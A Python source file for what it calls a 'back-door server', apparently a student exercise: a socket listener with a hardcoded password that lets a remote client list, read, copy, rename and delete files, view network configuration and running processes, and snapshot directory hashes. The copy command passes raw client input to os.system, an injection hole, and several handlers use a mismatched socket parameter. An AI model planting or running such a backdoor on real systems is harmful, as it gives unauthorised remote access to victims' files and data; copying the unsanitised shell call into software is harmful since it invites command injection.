import socketserver
import socket
import os
from subprocess import *
import subprocess
import sys
import hashlib
from os import walk

# Global dictionary to be used by snap and diff commands
snapshot = {}

#Method that gets the current working directory
def do_pwd(client_socket, args):
    client_socket.sendall( bytearray( "\033[94m"+os.getcwd()+"\n\033[0m", "utf-8"))

#Method that changes the current directpry to the path provided by the client
def do_cd(client_socket, args):
    if args[1]:
        #pop the first command, that is cd
        args.pop(0)
        #join all other arguments, that is the path
        arg = " ".join(args)
        try:
            os.chdir(arg)
            client_socket.sendall( bytearray( "\033[94m"+os.getcwd()+"\n\033[0m", "utf-8"))
        except:
            client_socket.sendall( bytearray("No such file or directory\n", "utf-8"))
    else:
        client_socket.sendall( bytearray("Invalid arguments!\n", "utf-8"))

#Get all files in current directory
def do_ls(self, args):
    files = os.listdir(os.getcwd())
    client_socket.sendall( bytearray( "\033[94m\n".join(files), "utf-8"))
    client_socket.sendall( bytearray( "\n\033[0m", "utf-8"))

# Remove the file specified by the user
def do_rm(client_socket, args): 
    if args[1]:
        #pop the first command, that is rm
        args.pop(0)
        #join all other commands that is the name of the file
        arg = " ".join(args)
        try:
            os.remove(arg)
            client_socket.sendall( bytearray( "\033[92mFile removed successfully\n\033[0m", "utf-8"))
        except:
            client_socket.sendall( bytearray("No such file or directory\n", "utf-8"))
    else:
        client_socket.sendall( bytearray("Invalid arguments!\n", "utf-8"))

#Display the contents of a file
def do_cat(client_socket,args):
    if args[1]:
        #Pop the first argument that is cat command
        args.pop(0)
        #join all other arguments that are the name of the file
        arg = " ".join(args)
        try:
            file = open(arg, "r")
            text = file.read()
            client_socket.sendall( bytearray( text+"\n", "utf-8"))
            file.close()
        except:
            client_socket.sendall( bytearray("No such file\n", "utf-8"))
    else:
        client_socket.sendall( bytearray("Invalid arguments!\n", "utf-8"))

# Log the user out by closing the client socket
def do_logout(client_socket,args):
    client_socket.sendall( bytearray("\033[1mGood Bye!\n\033[0m", "utf-8"))
    # close clients socket
    client_socket.close()

# shutdown the program bu closing both client and server sockets and exiting the program
def do_off(server,client_socket,args):
    client_socket.sendall( bytearray("\033[1mTerminating the server...!\n\033[0m", "utf-8"))
    # close clients socket
    client_socket.close()
    # close the server socket
    server.close()
    # terminate the program
    sys.exit()

# copy files from file 1 to file 2 by calling os.sytem and running the cp command
def do_cp(client_socket,args):
    if len(args) == 3:
        try:
            os.system("cp "+args[1]+" "+args[2])
            client_socket.sendall( bytearray("\033[92mCopy from "+args[1] +" to "+args[2] + " was successful\n\033[0m", "utf-8"))
        except:
            client_socket.sendall( bytearray("No such file or directory\n", "utf-8"))
    else:
        client_socket.sendall( bytearray("Invalid arguments!\n", "utf-8"))

# rename a file specified by the user by calling os.rename
def do_mv(client_socket,args):
    if len(args) == 3:
        try:
            os.rename(args[1],args[2])
            client_socket.sendall( bytearray("\033[92mRename was successful\n\033[0m", "utf-8"))
        except:
            client_socket.sendall( bytearray("No such file or directory\n", "utf-8"))
    else:
        client_socket.sendall( bytearray("Invalid arguments!\n", "utf-8"))

# Get users current network configurations by calling Popen
def do_net(self,args):
    p = Popen("ifconfig", shell=True, stdout=PIPE)
    output = p.communicate()[0]
    client_socket.sendall( bytearray(output))

# Inform users about the commands supported by this server. Function accepts arguments after help command to give users specific information abot commands
def do_help(client_socket,args):
    if len(args) == 1:
        client_socket.sendall( bytearray("Supported commands are:\n pwd, cd, ls, rm, cat, logout, off, cp, mv, net, snap, diff, 1more\n", "utf-8"))
    elif args[1] == "pwd":
        client_socket.sendall( bytearray("pwd - return the current working directory\n", "utf-8"))
    elif args[1] == "cd":
        client_socket.sendall( bytearray("cd <dir> - change the current working directory to <dir>\n", "utf-8"))
    elif args[1] == "ls":
        client_socket.sendall( bytearray("ls - list the contents of the current working directory\n", "utf-8"))
    elif args[1] == "rm":
        client_socket.sendall( bytearray("rm <file> - delete file\n", "utf-8"))
    elif args[1] == "cat":
        client_socket.sendall( bytearray("cat <file> - return contents of the file\n", "utf-8"))
    elif args[1] == "cp":
        client_socket.sendall( bytearray("cp <file1> <file2> - copy file1 to file2\n", "utf-8"))
    elif args[1] == "mv":
        client_socket.sendall( bytearray("mv <file1> <file2> - rename file1 to file2\n", "utf-8"))
    elif args[1] == "snap":
        client_socket.sendall( bytearray("snap - take a snapshot of all the files in the current directory and save it in memory\n", "utf-8"))
    elif args[1] == "diff":
        client_socket.sendall( bytearray("diff - compare the contents of the current directory to the saved snapshot, and report differences\n", "utf-8"))
    elif args[1] == "logout":
        client_socket.sendall( bytearray("logout - disconnect client\n", "utf-8"))
    elif args[1] == "off":
        client_socket.sendall( bytearray("off - terminate the backdoor program\n", "utf-8"))
    elif args[1] == "net":
        client_socket.sendall( bytearray("net - show current networking configuration\n", "utf-8"))
    elif args[1] == "ps":
        client_socket.sendall( bytearray("ps - show currently running processes\n", "utf-8"))
    else:
        client_socket.sendall( bytearray("\033[91mCommand does not exist!\n\033[0m", "utf-8"))

def checksum(file):
    hash_md5= hashlib.md5()
    with open(file, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

# Get all files in current directoy, compute their sha256 hash, and save it in the global dictionary
def do_snap(self,args):
    global snapshot
    snapshot = {}
    fileNames = []
    #get all file names, with paths, and adds them to fileNames list
    for f in os.listdir(os.getcwd()):
      file = os.path.join(os.getcwd(), f)
      if os.path.isfile(file):
        fileNames.append(file)
    
    #runs checksum on al files in the directory, then writes them to the snapshot
    for f in fileNames:
      
      snapshot[f] = checksum(f)

    client_socket.sendall( bytearray('\033[92msnap successful!\n\033[0m', "utf-8"))

# Compute a hash for the current working directory and compare the newly computed hash with the hash stored in dictionary via snap command. report back all the changes
def do_diff(self, args):
    if not snapshot:
        client_socket.sendall( bytearray("Snapshot does not exist!\n", "utf-8"))
    else:
        fileNames = []
        files = {}
        addedFiles = []
        deletedFiles = []
        modifiedFiles = []
        #creating temporary snapshot of current directory to compare to saved snapshot
        for f in os.listdir(os.getcwd()):
        #get all file names, with paths, and adds them to fileNames list
          file = os.path.join(os.getcwd(), f)
          if os.path.isfile(file):
            fileNames.append(file)
        
        #runs checksum on all files in directory, then writes them to the temporary snapshot dictionary
        for f in fileNames:
          files[f] = checksum(f)
        
        #checking for deleted filed
        for snapFileName in snapshot.keys():
          if snapFileName not in files.keys():
            deletedFiles.append(snapFileName)
          
          #checking for modified files
          elif snapshot[snapFileName] != files[snapFileName]:
            modifiedFiles.append(snapFileName)
        
        #checking for added files
        for currentFileName in files.keys():
           if currentFileName not in snapshot.keys():
              addedFiles.append(currentFileName)
        
        #Printing outputs
        client_socket.sendall( bytearray("Added files:\n", "utf-8"))
        for file in addedFiles:
          client_socket.sendall( bytearray(file+"\n", "utf-8"))
        client_socket.sendall( bytearray("Deleted files:\n", "utf-8"))
        for file in deletedFiles:
          client_socket.sendall( bytearray(file+"\n", "utf-8"))
        client_socket.sendall( bytearray("Modified files:\n", "utf-8"))
        for file in modifiedFiles:
          client_socket.sendall( bytearray(file+"\n", "utf-8"))    



# Gets all the processes running on this machine by calling subprocess. Sends the information to the client
def do_ps(client_socket, args):
    pl = subprocess.Popen(['ps', '-U', '0'], stdout=subprocess.PIPE).communicate()[0]
    client_socket.sendall( bytearray(pl))


# Structure so that the program can look into to decide which method to call based on user specified argument
interpretInput = {
    'pwd':do_pwd,
    'cd':do_cd,
    'ls':do_ls,
    'rm':do_rm,
    'cat':do_cat,
    'cp':do_cp,
    'mv':do_mv,
    'net':do_net,
    'help':do_help,
    'snap':do_snap,
    'diff':do_diff,
    'ps': do_ps
}

if __name__ == "__main__":
    HOST, PORT = "localhost", int(sys.argv[1])
    # Boolan to see if user is logged in
    loggedIn = False
    
    # Create a socket that can handle nc command
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Bind to the host and port and start listening
        server.bind((HOST, PORT))
        server.listen(0)
    except socket.error as e:
        if e.errno == 98:
            print("Port is already in use")


    try:
        while True:
            # Accept new clients and prompt them to login
            client_socket, info= server.accept()
            client_socket.send(b'\033[1mPlease enter the password:\n\033[0m')
            while True:
                # Recieve data from client
                data = client_socket.recv(128).decode('utf8').strip()
                print(data)
                if not loggedIn:
                    # Check user's credintials
                    if data == "password":
                        loggedIn = True
                        # Prompt user to enter a command
                        client_socket.send(b'\033[1mWelcome to the back-door server\nEnter your commands:\n\033[0m')
                    else:
                        # Terminate client socket if wrong password is inputted
                        client_socket.send(b'\033[91mWrong password! bye\n\033[0m')
                        client_socket.close()
                        break
                else:
                    # Interpret user info by matching it with one of the definitions in the variable
                    args = data.split()
                    if args[0] == "off":
                        do_off(server,client_socket,args)
                    elif args[0] == "logout":
                        do_logout(client_socket,args)
                        loggedIn = False
                        break
                    else:
                        if not args[0] in interpretInput:
                            client_socket.send(b'\033[91mNo such command\n\033[0m')
                        else:
                            interpretInput[args[0]](client_socket,args)
    except Exception as err:
        print(err)

# close clients socket
client_socket.close()
# close the server socket
server.close()
# terminate the program
sys.exit()




